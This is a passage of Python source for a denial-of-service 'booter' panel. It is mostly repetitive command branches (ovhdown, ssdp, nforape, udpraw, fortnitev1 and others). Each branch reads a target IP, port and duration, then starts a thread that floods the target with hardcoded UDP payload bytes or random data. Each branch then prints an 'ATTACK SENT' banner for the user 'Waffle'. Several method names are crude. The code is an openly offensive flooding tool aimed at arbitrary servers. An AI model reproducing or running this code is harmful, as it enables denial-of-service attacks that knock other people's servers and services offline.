\t\t[ $ ]\033[1;32;40m METHOD      : [OVH-KILL]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [OVH-DOWN]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [SSDP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HYDRA-KILLER]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [NFO-NULL]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [KILLALL]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [OVH-SLAV]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [CPU-KILL]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [TCP-RAPE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [NFO-RAPE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [UDP-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [TCP-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HEX-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [STD-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VSE-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [SYN-RAW]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
		elif sinput == "fortnitev1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [FORTNITEV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
